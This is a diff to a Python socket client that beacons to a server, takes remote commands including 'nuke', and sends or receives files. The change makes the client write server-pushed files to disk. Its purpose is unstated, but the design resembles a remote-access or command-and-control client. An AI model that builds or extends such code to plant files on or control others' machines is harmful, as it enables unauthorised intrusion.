@@ -11,7 +11,6 @@ def  create_client(server_ip, server_port):
     client_socket.send("<ON>".encode())
     while True:
         response = client_socket.recv(10240)
-        print(response.decode())
         if(response.decode()=="Command Mode"):
             response = client_socket.recv(10240)
             if response.decode().lower() == 'nuke':
@@ -29,8 +28,7 @@ def  create_client(server_ip, server_port):
             while True:
                 response = client_socket.recv(10240)
                 command = response.decode().strip().lower()
-                print(command,response)
-                print(command.startswith('send'))
+                
 
                 if command == 'nuke':
                     client_socket.send('nuke'.encode())
@@ -40,20 +38,25 @@ def  create_client(server_ip, server_port):
                     continue
                 elif command.startswith('send'):
                     try:
-                        print("enterd")
+                        
                         _, file_name = command.split(" ", 1)
-                        print(file_name)
-                        print( os.path.exists("dev.ps1"))
+                                    # Check if the file already exists to avoid overwriting
                         if not os.path.exists(file_name):
                             client_socket.send("READY".encode())
-                            print("ready")
-                            with open(file_name, "rb") as file:
-                                print(file)
-                                while chunk := file.read(1024):
-                                    client_socket.send(chunk)
-                                client_socket.send(b"DONE")
+                           
+
+                            with open(file_name, "wb") as file:
+                                while True:
+                                    chunk = client_socket.recv(1024)
+                                    if b"DONE" in chunk:
+                                        file.write(chunk.split(b"DONE")[0])
+                                        break
+                                    file.write(chunk)
+                            
+                            continue
                         else:
-                            client_socket.send(f"File '{file_name}' does not exist.".encode())
+                            client_socket.send(f"File '{file_name}' already exists.".encode())
+                            print(f"File '{file_name}' already exists. Informing the server.")
                     except Exception as e:
                         client_socket.send(f"Error: {e}".encode())
                 elif command.startswith('recv'):
@@ -63,7 +66,8 @@ def  create_client(server_ip, server_port):
                         with open(file_name, "wb") as file:
                             while True:
                                 chunk = client_socket.recv(1024)
-                                if chunk == b"DONE":
+                                if chunk.decode() == "DONE":
+                                    print("!!!")
                                     break
                                 file.write(chunk)
                     except Exception as e:
